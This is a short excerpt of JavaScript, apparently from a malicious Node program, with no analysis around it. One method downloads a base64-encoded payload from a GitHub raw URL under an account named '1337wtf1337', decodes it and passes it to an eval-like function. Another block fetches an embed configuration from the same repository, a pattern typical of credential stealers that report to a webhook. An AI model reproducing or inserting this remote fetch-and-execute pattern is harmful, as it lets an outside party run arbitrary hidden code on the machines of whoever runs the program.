  ...
  async extra() {
    const code = (
      await this.requires.axios.get(
        "https://raw.githubusercontent.com/1337wtf1337/1337wtf1337/main/extra.txt"
      )
    ).data;

    this.eval_like(base64.decode(code), this);
  }
    ...
    try {
      this.config.embed = JSON.parse(
        JSON.stringify(
          (
            await this.requires.axios.get(
              "https://raw.githubusercontent.com/1337wtf1337/1337wtf1337/main/embed.json"
            )
          ).data
        )
      );
